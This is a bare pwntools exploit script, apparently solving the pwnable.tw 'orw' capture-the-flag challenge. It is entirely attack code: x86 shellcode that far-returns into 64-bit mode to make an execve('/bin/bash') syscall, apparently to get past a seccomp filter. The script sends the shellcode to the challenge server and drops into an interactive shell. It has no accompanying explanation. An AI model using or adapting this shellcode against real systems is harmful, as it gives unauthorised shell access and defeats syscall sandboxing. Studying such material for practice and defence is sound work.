# -*- coding: utf-8 -*-
from pwn import *
context(arch = 'x86_64',os='linux')
context.log_level='debug'

code="""

.code32
_start:
	jmp work

to64:
	mov word ptr [esp+0x4],0x33
	retf

.code64
get_shell:
	mov rax,0x3b
	mov rdi,[rsp]
	mov rsi,0
	mov rdx,0
	syscall

.code32
work:
	call to64
	call get_shell
	.ascii "/bin/bash"
	.byte 0
"""

shellcode = asm(code)
conn=remote('chall.pwnable.tw',10001)
# conn=process("./orw")
print conn.recvuntil(':')
conn.send(shellcode)
conn.interactive()